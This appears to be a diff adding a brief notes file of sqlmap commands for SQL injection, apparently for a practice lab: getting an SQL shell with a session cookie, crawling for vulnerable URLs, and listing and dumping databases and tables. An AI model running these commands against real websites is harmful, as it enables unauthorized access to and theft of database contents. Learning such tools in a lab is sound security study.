@@ -1,0 +1,15 @@
+First check if the webpage is accessible to sqlinjection
+
+sqlmap -u '<vulnarablewebsite' --cookie='PHPSESSID=<sessionid>; security=low' --sql-shell --batch
+
+To find the vulnarable url
+  sqlmap -u '<url>' --crawl=2 --batch
+
+To find the databases on the given url
+  sqlmap -u '<url>' --dbs --batch
+
+To find tables in database
+  sqlmap -u '<url>' -D <dbname> --tables --batch
+
+For listing all content in database
+  sqlmap -u '<url>' -D <database> -T <tablename> --dump-all --batch
